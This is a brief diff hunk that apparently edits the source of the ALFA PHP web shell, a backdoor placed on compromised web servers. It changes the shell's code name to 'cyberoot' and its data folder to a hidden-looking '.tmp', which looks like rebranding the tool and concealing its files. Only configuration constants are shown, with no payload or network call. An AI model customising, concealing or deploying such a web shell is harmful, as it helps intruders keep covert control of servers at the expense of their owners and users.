@@ -251,8 +251,8 @@ if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_
 if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
 define("__ALFA_VERSION__", "4.1");
 define("__ALFA_UPDATE__", "2");
-define("__ALFA_CODE_NAME__", "XXVI");
-define("__ALFA_DATA_FOLDER__", "jancox");
+define("__ALFA_CODE_NAME__", "cyberoot");
+define("__ALFA_DATA_FOLDER__", ".tmp");
 define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
 define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
 $GLOBALS['__ALFA_COLOR__'] = array(
